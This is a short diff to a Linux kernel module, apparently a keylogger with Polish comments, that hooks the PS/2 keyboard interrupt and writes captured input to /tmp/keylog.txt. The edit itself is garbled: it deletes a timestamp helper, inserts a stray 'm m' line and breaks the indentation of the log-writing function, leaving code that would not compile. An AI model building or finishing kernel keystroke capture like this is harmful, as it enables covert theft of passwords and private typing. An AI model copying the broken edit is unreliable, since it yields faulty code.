@@ -13,29 +13,23 @@
 #include <linux/inetdevice.h>
 #include <asm/processor.h>
 
-#include "codeTable.h" 
-#include "uniqueIdGenerator.h"
+#include "codeTable.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Your Name");
 MODULE_DESCRIPTION("Button Input Driver with Key Logging");
 
-#define BUTTON_PORT 0x60 // Port klawiatury PS/2
-#define BUTTON_IRQ 1     // IRQ klawiatury PS/2
+#define BUTTON_IRQ 1 // IRQ klawiatury PS/2
 #define LOG_FILE_PATH "/tmp/keylog.txt"
 
-static struct input_dev *button_dev; 
+static struct input_dev *button_dev;
 const char *uniqueId;
 
-static void getCurrentTime(char *buffer, size_t buffer_size)
-{
-    struct timespec64 ts;
-    ktime_get_real_ts64(&ts);
-    snprintf(buffer, buffer_size, "%lld.%09ld", (long long)ts.tv_sec, ts.tv_nsec);
-}
+m m
 
-// Funkcja zapisująca dane do pliku logu
-static void write_to_log_file(const char *data)
+    // Funkcja zapisująca dane do pliku logu
+    static void
+    write_to_log_file(const char *data)
 {
     loff_t pos = 0;
     struct file *log_file;
